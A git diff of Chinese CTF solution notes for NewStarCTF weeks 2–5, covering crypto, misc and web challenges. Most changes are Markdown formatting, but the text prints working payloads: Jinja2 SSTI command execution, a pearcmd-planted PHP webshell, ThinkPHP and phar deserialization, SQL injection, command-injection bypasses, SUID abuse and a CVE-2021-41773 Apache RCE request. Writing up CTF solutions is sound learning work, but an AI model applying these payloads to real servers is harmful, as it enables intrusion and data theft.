@@ -10,15 +10,21 @@ rsa 维纳攻击
 ## week2
 ### misc
 #### 奇怪的波形
-侧信道
+侧信道  
+
 看两个波形差距
+
 #### 奇怪的二维码
-二维码（Aztec Code
+二维码（Aztec Code  
+
 [在线生成条形码 (aspose.app)](https://products.aspose.app/barcode/zh-hans/generate)
+
 ### crypto
 #### ezRabin
-rabin加密时e为2，本题目e为4，一次解密得到的是m^2 mod n，再解密一次就能得到m
+rabin加密时e为2，本题目e为4，一次解密得到的是m^2 mod n，再解密一次就能得到m  
+
 [RSA攻击之Rabin密码体制_Gm1y的博客-CSDN博客_rabin密码](https://blog.csdn.net/jcbx_/article/details/101066670)
+
 #### ezPRNG
 task.py：
 ```python
@@ -51,10 +57,14 @@ print(gift)
 # 3378007627369454232183998646610752441039379051735310926898417029172995488622, 
 # 35893579613746468714922176435597562302206699188445795487657524606666534642489]
 ```
-[https://www.codercto.com/a/35743.html](https://www.codercto.com/a/35743.html)
-[Crypto学习笔记 – 天璇Merak (buptmerak.cn)](https://we.buptmerak.cn/archives/210)
-[PRNG伪随机数的破解方法_OnlyForBetter的博客-CSDN博客_prng](https://blog.csdn.net/hacker_zrq/article/details/120891641)
+[https://www.codercto.com/a/35743.html](https://www.codercto.com/a/35743.html)  
+
+[Crypto学习笔记 – 天璇Merak (buptmerak.cn)](https://we.buptmerak.cn/archives/210)  
+
+[PRNG伪随机数的破解方法_OnlyForBetter的博客-CSDN博客_prng](https://blog.csdn.net/hacker_zrq/article/details/120891641)  
+
 exp.py：
+
 ```python
 from Crypto.Util.number import *
 from functools import reduce
@@ -90,10 +100,14 @@ print(long_to_bytes(flag).decode())
 ```
 ### web
 #### IncludeOne
-php伪随机数
-[php_mt_seed - PHP mt_rand() seed cracker (openwall.com)](https://www.openwall.com/php_mt_seed/)
-php伪协议（rot13
+php伪随机数  
+
+[php_mt_seed - PHP mt_rand() seed cracker (openwall.com)](https://www.openwall.com/php_mt_seed/)  
+
+php伪协议（rot13  
+
 payload
+
 ```
 ?file=php://filter/read=string.rot13/NewStar/resource=./flag.php
 guess=1202031004
@@ -160,9 +174,12 @@ if(isset($_POST['pop'])){
     unserialize($_POST['pop']);
 }
 ```
-[PHP反序列化研究 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/377676274)
-（序列化保存对象成员值，自定义函数不会保存
+[PHP反序列化研究 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/377676274)  
+
+（序列化保存对象成员值，自定义函数不会保存  
+
 exp.php
+
 ```php
 <?php
 class Start{
@@ -220,9 +237,11 @@ echo urlencode(serialize($Start2));
 ?>
 ```
 #### ezAPI
-御剑扫到www.zip源码
+御剑扫到www.zip源码  
+
 index.php
-```php
+
+```php+HTML
 <!DOCTYPE html>
 <html>
 
@@ -325,9 +344,12 @@ index.php
 ```php
 isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
 ```
-参考：[当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io)](https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/)
-大体解析过程，是遇到一个Query就取值，对返回值解析，递归遍历
+参考：[当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io)](https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/)  
+
+大体解析过程，是遇到一个Query就取值，对返回值解析，递归遍历  
+
 常见爆信息payload：
+
 ```php
 query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 ```
@@ -348,31 +370,43 @@ data={"query":"query {ffffllllaaagggg_1n_h3r3_flag{flag}}"}
 ## week3
 ### web
 #### BabySSTI_One
-flask ssti注入
-[Python安全 | Flask-jinja2 SSTI 利用手册 - Python社区 (python88.com)](http://www.python88.com/topic/115601)
-思路：找到os，执行命令读取
-绕过：|attr() 加 字符串拼接
+flask ssti注入  
+
+[Python安全 | Flask-jinja2 SSTI 利用手册 - Python社区 (python88.com)](http://www.python88.com/topic/115601)  
+
+思路：找到os，执行命令读取  
+
+绕过：|attr() 加 字符串拼接  
+
 payload：
-```
+
+```bash
 ?name=%7B%7B()|attr("__cla"+"ss__")|attr("__bas"+"es__")|attr("__getitem__")(0)|attr("__subcl"+"asses__")()|attr("__getitem__")(117)|attr("__in"+"it__")|attr("__globals__")|attr("__getitem__")("popen")("ca"+"t%20/fl"+"ag_in_here")|attr("read")()%7D%7D
 ```
 #### multiSQL
-堆叠注入+update
-[BUUCTF-Web-随便注(三种解题思路) - 简书 (jianshu.com)](https://www.jianshu.com/p/36f0772f5ce8)
-绕过：预处理语句 + concat字符串拼接
+堆叠注入+update  
+
+[BUUCTF-Web-随便注(三种解题思路) - 简书 (jianshu.com)](https://www.jianshu.com/p/36f0772f5ce8)  
+
+绕过：预处理语句 + concat字符串拼接  
+
 payload：
-```
+
+```bash
 ?username=1' or ''='';SET @sql=concat('up','date score SET listen=200');PREPARE jwt from @sql;EXECUTE jwt;#
 ```
 #### IncludeTwo
-percmd.php + rce
-[Sourceless Guessy Web (pearcmd+rce)](http://landasika.top/2022/06/11/sourceless-guessy-web/)
+percmd.php + rce  
+
+[Sourceless Guessy Web (pearcmd+rce)](http://landasika.top/2022/06/11/sourceless-guessy-web/)  
+
 payload:
-```
+
+```bash
 ?file=pearcmd&+config-create+/<?=@eval($_POST['cmd']);?>+./cmd.php
 ```
 中国蚁剑连接
-```
+```bash
 url?file=./cmd
 cmd
 ```
@@ -380,9 +414,11 @@ cmd
 [https://www.freebuf.com/vuls/263977.html](https://www.freebuf.com/vuls/263977.html)
 thinkphp5.1.41 rce漏洞 + cookie
 [https://www.anquanke.com/post/id/241148](https://www.anquanke.com/post/id/241148)
-linux proc获取环境变量信息发现flag
+linux proc获取环境变量信息发现flag  
+
 payload：
-```
+
+```bash
 Cookie: tp_user=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=
 ?name=cat%20/proc/self/environ
 ```
@@ -415,7 +451,7 @@ print(f'g = {g}')
 print(f'师傅的公钥 = {gb}')
 ```
 output.txt
-```
+```python
 师傅给你送了一个flag
 加密的flag = b'w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH'
 p = 133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913
@@ -468,15 +504,17 @@ for _ in range(4):
 print(n)
 ```
 output.txt：
-```
+```python
 (107156592202708719207677242145785380370925248573491581679548864240229105117413, 130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902)
 (90629424458637844580841178302065768114471702341586161908858665404968070428143, 78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662)
 (100626477579781167218124067468465940736522526684796828200460725563611057086831, 107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270)
 (93935717805931479760310332373603550626215862380271563609987050092246456803681, 87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670)
 31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579
 ```
-拉格朗日插值
+拉格朗日插值   
+
 exp.py
+
 ```python
 from Crypto.Util.number import *
 x = [107156592202708719207677242145785380370925248573491581679548864240229105117413,90629424458637844580841178302065768114471702341586161908858665404968070428143,100626477579781167218124067468465940736522526684796828200460725563611057086831,93935717805931479760310332373603550626215862380271563609987050092246456803681]
@@ -627,10 +665,14 @@ def kasiski_test(ciphretext:bytes, length=3):
         print(f'key length: {str(t[0]).rjust(width, " ")} with probability {t[1]}')
     return pre_sort[-1][0]
 ```
-多字节秘钥xor，利用gift_from_sias27.py中的kasiski_test算出秘钥长度为5，再将密文分组，每组的秘钥为1字节，可根据明文特征（可打印字符；字频；等等）爆破出秘钥
-[加密 - 第1部分。打破异或加密。|戒指0x00 (idafchev.github.io)](https://idafchev.github.io/crypto/2017/04/13/crypto_part1.html)
-exp.py：
+多字节秘钥xor，利用gift_from_sias27.py中的kasiski_test算出秘钥长度为5，再将密文分组，每组的秘钥为1字节，可根据明文特征（可打印字符；字频；等等）爆破出秘钥  
+
+[加密 - 第1部分。打破异或加密。|戒指0x00 (idafchev.github.io)](https://idafchev.github.io/crypto/2017/04/13/crypto_part1.html)  
+
+exp.py：  
+
 可打印字符（慢
+
 ```python
 import gift_from_sias27
 from pwn import xor
@@ -749,7 +791,7 @@ if __name__=="__main__":
 # c = b'c82dc20b7512d03f1a0982eb8a6e855db20f6fe3ff8d202a6fb74c6522fa6e623c6abe6725cafe78f9624ad59f3e90af6f985f38f75ec4d62ff7e02bd7c2f051'
 ```
 msg.txt：
-```
+```bash
 73b9dad54a5fad919e9fc68e60fe25f8d98d5ac2d564d1f2885a6b744da3eb95
 5a63a00cd3bdfc8eb5fbf3c6113bd1c50112fd52b775a2791c07b32b8defb823
 48536d1739a3cf9434664cfd5d78083e97cee2cc79145c5d7097c4ed92cc9878
@@ -959,10 +1001,14 @@ a3dbd3ff4c38ed47ea8ef4311698f52696995abe6a2eb6bdbe49f54879032fa3
 b94334cc1765db1fb2a5a2d2a128d2822bd31dfd45871aa5bfbd74e8e8b2b7f5
 cd7b3935b995eea29d986c758c23df1a58cca61df612422f99958b8a6ad8e09f
 ```
-getrandbits伪随机数预测，至少需要624个32bit数才能预测，getrandbits(64)看成两个getrandbits(32)，先低位后高位
-[浅析MT19937伪随机数生成算法-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/205861#h3-4)
-[https://blog.y7n05h.dev/random/#Random](https://blog.y7n05h.dev/random/#Random)
+getrandbits伪随机数预测，至少需要624个32bit数才能预测，getrandbits(64)看成两个getrandbits(32)，先低位后高位 
+
+[浅析MT19937伪随机数生成算法-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/205861#h3-4)  
+
+[https://blog.y7n05h.dev/random/#Random](https://blog.y7n05h.dev/random/#Random)  
+
 exp.py：
+
 ```python
 from Crypto.Cipher import AES
 from binascii import a2b_hex
@@ -1042,7 +1088,7 @@ print(c.decode())
 print(m.decode("utf-8","ignore"))
 ```
 old_m.txt：
-```
+```bash
 799EEED5854C6F6C7E0905B2
 770A6C6EBA0C566FE031A94D
 DFA02A4E0B07EECEF47963F8
@@ -1255,26 +1301,37 @@ DD1B9D1D82F9C82A7BDC11A1
 ## week4
 ### web
 #### BabySSTI_Two
-[SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)
-[]绕过“和关键字；hex编码或Unicode绕过
+[SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)  
+
+[]绕过“和关键字；hex编码或Unicode绕过  
+
 payload：
+
 ```
 ?name={{''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[117]['__in''it__']['__glo''bals__']['po''pen']('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64')['re''ad']()}}
 ```
 #### 又一个SQL
-绕过空格：%0c
-前面数字不能直接引号闭合，直接写个没有数据的数字（没遇到
+绕过空格：%0c  
+
+前面数字不能直接引号闭合，直接写个没有数据的数字（没遇到  
+
 payload：
+
 ```
 name=122%0cunion%0cselect%0ctext,id%0cfrom%0cwfy_comments%0cwhere%0cid=100
 ```
 （数据库没换过，可以直接看前几周的
 #### So Baby RCE
-绕过关键词：${11}
-绕过空格：%09
-绕过分号：%0a
-绕过文件名fl：shell特殊变量 $@
+绕过关键词：`${11}`  
+
+绕过空格：`%09`  
+
+绕过分号：`%0a`  
+
+绕过文件名fl：shell特殊变量 `$@`  
+
 payload：
+
 ```
 cmd=cd%09..%0acd%09..%0acd%09..%0aca${11}t%09ffff$@llllaaaaggggg
 ```
@@ -1298,10 +1355,14 @@ class Evil{
 
 file_exists($_GET['file']);
 ```
-文件上传+反序列化  一般为phar
-参考：[反序列化之Phar流 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1740438)
-上传phar文件，利用伪协议读取，触发反序列化
+文件上传+反序列化  一般为phar  
+
+参考：[反序列化之Phar流 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1740438)  
+
+上传phar文件，利用伪协议读取，触发反序列化  
+
 生成phar
+
 ```php
 <?php
     class Evil{
@@ -1321,18 +1382,27 @@ file_exists($_GET['file']);
 ```php
 class.php?file=phar://文件路径
 ```
-之后更改$cmd重新上传就能得到flag
+之后更改$cmd重新上传就能得到flag  
+
 phar报错：将php.ini中的 `;phar.readonly = On` 改为 `phar.readonly = Off`
+
 #### ！！！Rome
-java反序列化 ROME链
-工具：ysoserial [ysoserial使用方法 – cc (ccship.cn)](https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#toc-head-3)
+java反序列化 ROME链  
+
+工具：ysoserial [ysoserial使用方法 – cc (ccship.cn)](https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#toc-head-3)  
+
 反编译[Release JD-GUI 1.6.6 · java-decompiler/jd-gui (github.com)](https://github.com/java-decompiler/jd-gui/releases/tag/v1.6.6)
+
 ### crypto
 #### LCG Revenge
-线性同余式
-[Crypto-LCG（线性同余方程） | 此间的少年 (gitee.io)](https://xie-yuanhao.gitee.io/2022/01/10/Crypto-LCG%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99/#%E4%BB%80%E4%B9%88%E6%98%AF-LCG)
-x(n+1) = (a*x(n)+c) (mod m)
-t*a=1 (mod m),  x(n) = t*(x(n+1)-c) (mod m)
+线性同余式  
+
+[Crypto-LCG（线性同余方程） | 此间的少年 (gitee.io)](https://xie-yuanhao.gitee.io/2022/01/10/Crypto-LCG%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99/#%E4%BB%80%E4%B9%88%E6%98%AF-LCG)  
+
+x(n+1) = (a * x(n)+c) (mod m)  
+
+t * a=1 (mod m),  x(n) = t * (x(n+1)-c) (mod m)
+
 ```python
 from Crypto.Util.number import *
 from secret import FLAG
@@ -1406,7 +1476,7 @@ print(f'c2 = {c2}')
 print(f'c3 = {c3}')
 print(f'gift_from_fallwind = {gift_from_fallwind}')
 ```
-```
+```bash
 n = 714592173868259951547903824656567142382519201815807137392662736000480461106944240411907971077744283561181468187349950157770542641452016168710768060100431878635594871092115167496636869765435245733216244455291669985854820686150487479060100362374214950338593785006799039892489525125499595277195821419495485780569578409849268011672935670978669183434574625404664252352238179018153026065565737180327403650490113961989352069795255693066847568569258596045200617988242378417608661573561288798387013713959291514998718810340095720086582431808535500784877130015856483311803720730193251968718389940211890886176473856457082812043712013634688479195044004890584238387779313840532514565194377261080408568578839974414957533288241409106206637332990105576057838430267703746376981194305776942499262213827373958311438790046259142383469934115411137484269094594634801601455381187640866738280586324069047262621776502056490534194678730988305691412586133810702956723819024793893235153104715079346666767828770304227597496868066084967074574249861996861449220457370695654952738759446674531850565616794250604969906523629086439326216263355721761747979532714573810102811235244618245569028203230483116293028005467298691574981713677092048315265963514382056811642161463
 e1 = 42407
 e2 = 42299
@@ -1416,9 +1486,12 @@ c2 = 337796038485337223816475984950456810748129968181260652436798659350041388661
 c3 = 424077500283538548695429029734927642518438524525805172568745880982861798954369892065855075306396658578715593140988681322211943800827469098807795208943724228288132152970084568728843669855312178059145983168245747282178118927927118026053179993918910256713266934916520151359475678446638810022833365506023312578408649890108868706577071610442415250434663703848788000124360027832658586954993369200881819393055860013390887044444898844318376925700215369036711799193621862491000483927756231147580685621531144248717419030824674055599055717010063636336702022163459269369324701987636772581709509640297923613071083421937504088720011643179567005037514310053762735787172663099935520119785909997287518567706508640150762285653766660798661964916169965639164375045609322144422628622388969490052285300841751657575450486389268063959043056821417358486314747981330380819421643688151487077209015995287339609841113765813462834471270766622938036101602597257457988755053683191621395473412095142041134027974560324126052952093513827172817662085883985649068515306916979488707694772473239863027480932340145990906115024722682989661592015805559935349596282010900810573490368602483785908673810154811269934225750196861258621132739166572297393817253205915435333491161203
 gift_from_fallwind = 436057126906623515829218011238744316017674469205661117597268470150957758251976942445150879861108983042930734360653000973980600283904101499137333865224021780243160123582776537464659885717072177232387979780155820186376822704547514869653697300455384885557911728798950305201936973078685581794365075352341541134238714464727825137128067542739078985472265837037034067906587445615146595102552611894550913742780821268889878629177560903295511218320565910385133911886947889495561650713735268032963799756628442264275798506978864616008762967965435601210553178014009864471368535327898667309420704800396343299194692424445757081230545316510925050736165766681764700768348825662815908360495749201689747586178884303154943439689695756080847567228630187446741488386672483582019385735879376786013583105010830909520853067056907311999554079858869757789193026155282645740531423042696088661716948429683650063340097187696375083991311139748519133745606598795309849873485013934772051034350080361176801194568727665884824462291930504184029406404464952205159309484625000859491407470043008763418189126078287693565790619787102318883565462574011050013632489624673181763059753755492153825048101618871500056894854231049792292739927027237110872703608633932490764567008732
 ```
-e1*d1=e2*d2 (mod phi) ==> e1*e2*(d2-d1)-(e1-e2)=kphi
-e1*d4 = 1 (mod kphi) ==> d4 = d1 (mod phi)
+e1 * d1=e2 * d2 (mod phi) ==> e1 * e2 * (d2-d1)-(e1-e2)=kphi  
+
+e1 * d4 = 1 (mod kphi) ==> d4 = d1 (mod phi)  
+
 exp：
+
 ```python
 from Crypto.Util.number import *
 import gmpy2
@@ -1445,53 +1518,71 @@ print(flag)
 ## week5
 ### web
 #### BabySSTI_Three
-方括号加hex编码绕过
-（hex编码不知道怎么用脚本写，都是手动，后面想想
+方括号加hex编码绕过  
+
+（hex编码不知道怎么用脚本写，都是手动，后面想想  
+
 payload：
-```
+
+```bash
 ?name={{''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f'][0]['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']()[117]['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x70\x6f\x70\x65\x6e']('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64')['re''ad']()}}}}
 ```
 #### So Baby RCE Again
-shell_exec 无回显
-ls || sleep 3，判断命令是否执行成功
-可以访问网站目录下文件，将命令执行结果输出到index.txt
-在根目录找到/ffll444aaggg，但无权访问
+shell_exec 无回显  
+
+ls || sleep 3，判断命令是否执行成功  
+
+可以访问网站目录下文件，将命令执行结果输出到index.txt  
+
+在根目录找到/ffll444aaggg，但无权访问  
+
 发现/bin/date执行权限为s，可以suid提权，将报错输出到index.txt
-```
+
+```bash
 ?cmd=/bin/date -f /ffll444aaggg 2> index.txt||sleep 3
 ```
 #### Give me your photo PLZ
-文件上传
-传.htaccess解析，再传后门
+文件上传  
+
+传.htaccess解析，再传后门  
+
 蚁剑连接，打开根目录flag
-```
+
+```bash
 恭喜你做到这里，这周的比赛结束后，NewStarCTF也就告一段落了，不过，我们不希望这事你CTF旅途的终点，现在去env里面拿你真正的flag吧
 ```
 env命令显示环境变量，得到flag
 #### Unsafe Apache
-[CVE-2021-41773 Apache HTTP Server 路径穿越漏洞复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/293172.html)
-CVE-2021-41773，开启了cgi，可构造恶意请求执行命令
+[CVE-2021-41773 Apache HTTP Server 路径穿越漏洞复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/293172.html)  
+
+CVE-2021-41773，开启了cgi，可构造恶意请求执行命令  
+
 poc：
-```
+
+```bash
 POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh
 # data
 echo; ls /
 ```
 exp:
-```
+```bash
 POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh
 # data
 echo; cat /ffffllllaaagggg_cc084c485d
 ```
 curl:
-```
+```bash
 curl --date "echo;cat /ffffllllaaagggg_cc084c485d" 'http://ip:port/cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh'
 ```
 #### Final round
-sql注入，无回显，非windows无法dnslog，只能时间盲注
-/x0c绕过空格
-（手动用上周的%0c成功，python中失败，怪
+sql注入，无回显，非windows无法dnslog，只能时间盲注  
+
+/x0c绕过空格  
+
+（手动用上周的%0c成功，python中失败，怪  
+
 python
+
 ```python
 import requests
 import time
@@ -1567,14 +1658,21 @@ while True:
     else:
         print("WTF")
 ```
-[CBC Bit-Flipping Attack Conclusion · Automne's Shadow (ce-automne.github.io)](https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/)
-AES CBC 模式的字节翻转攻击(CBC Bit-Flipping Attack)
+[CBC Bit-Flipping Attack Conclusion · Automne's Shadow (ce-automne.github.io)](https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/)  
+
+AES CBC 模式的字节翻转攻击(CBC Bit-Flipping Attack)  
+
 CBC是分组加密，前一组密文与这一组明文异或，第一组明文与偏移向量iv异或；解密类似
-前一组密文翻转某一字节，这一组明文对应字节翻转
-按字节将前一组密文xor原明文xor需要的明文，则解密后可得到需要的明文
-AAB = B
-本题只有一组，直接将iv各个字节异或
+前一组密文翻转某一字节，这一组明文对应字节翻转  
+
+按字节将前一组密文xor原明文xor需要的明文，则解密后可得到需要的明文  
+
+AAB = B  
+
+本题只有一组，直接将iv各个字节异或  
+
 exp：
+
 ```python
 from pwnlib.tubes.remote import remote
 
@@ -1649,7 +1747,7 @@ print(ciphretext.hex())
 print(iv.hex())
 ```
 output.txt：
-```
+```bash
 14489
 10289
 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661
@@ -1659,10 +1757,14 @@ output.txt：
 d151c04c645c3e2a8d3f1ae44589ef20
 ```
 ECDH
-[图解 ECDHE 密钥交换算法 - 小林coding - 博客园 (cnblogs.com)](https://www.cnblogs.com/xiaolincoding/p/14318338.html)
-类似DH，先创建椭圆曲线GF(p)和G，A和B双方选择a和b，得到各自公钥a*G和b*G，发送后得到共享私钥a*b*G
-本题给了B的公钥和a直接创建椭圆曲线，令G = B的公钥，则私钥 = G*a
+[图解 ECDHE 密钥交换算法 - 小林coding - 博客园 (cnblogs.com)](https://www.cnblogs.com/xiaolincoding/p/14318338.html)  
+
+类似DH，先创建椭圆曲线GF(p)和G，A和B双方选择a和b，得到各自公钥a*G和b*G，发送后得到共享私钥a*b*G  
+
+本题给了B的公钥和a直接创建椭圆曲线，令G = B的公钥，则私钥 = G*a  
+
 exp.py：
+
 ```python
 from Crypto.Cipher import AES
 from hashlib import md5
